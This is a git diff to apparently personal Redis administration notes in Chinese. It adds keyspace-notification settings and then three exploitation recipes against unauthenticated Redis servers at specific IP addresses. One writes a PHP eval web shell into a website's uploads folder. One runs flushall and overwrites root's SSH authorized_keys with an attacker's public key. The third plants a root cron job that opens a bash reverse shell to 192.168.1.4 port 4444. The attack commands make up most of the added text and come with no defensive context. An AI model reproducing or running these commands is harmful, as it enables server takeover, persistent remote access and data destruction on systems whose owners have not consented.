@@ -217,8 +217,11 @@ redis-cli -p 1111 hotkey | cat
 开启订阅KEY过期
 vi /etc/redis.conf
 notify-keyspace-events "Ex"
+notify-keyspace-events "KEA"
 maxmemory 1024mb #限定最多使用1GB内存
 maxmemory-policy allkeys-lru #设置策略为清理最少使用的key对应的数据
+
+config set notify-keyspace-events KEA
 
 redis-cli
 subscribe __keyevent@0__:expired
@@ -259,3 +262,25 @@ auto-aof-rewrite-min-size 64mb
 redis-benchmark -h 127.0.0.1 -p 6379 -c 100 -n 100000
 redis-benchmark -h 10.1.1.96 -p 6379 -c 100 -n 100000
 redis-benchmark -h 10.1.1.96 -p 6379 -q -d 500
+
+redis-cli -h 192.168.5.135
+set one "\n\n\n<?php @eval($_POST['c']);?>\n\n\n"
+config set dir  /var/www/html/dedecms/uploads
+config set dbfilename webshell.php
+save
+
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
+cat key.txt | redis-cli -h 173.239.46.188 -x set crackit
+redis-cli -h 192.168.5.135
+flushall
+config get dir
+CONFIG SET dir /root/.ssh
+CONFIG SET dbfilename authorized_keys
+SAVE
+
+redis-cli -h 192.168.1.8
+set test "\n* * * * * bash -i >& /dev/tcp/192.168.1.4/4444 0>&1\n"
+config set dir /var/spool/cron  #设置工作目录
+config  set dbfilename "root"
+save
+
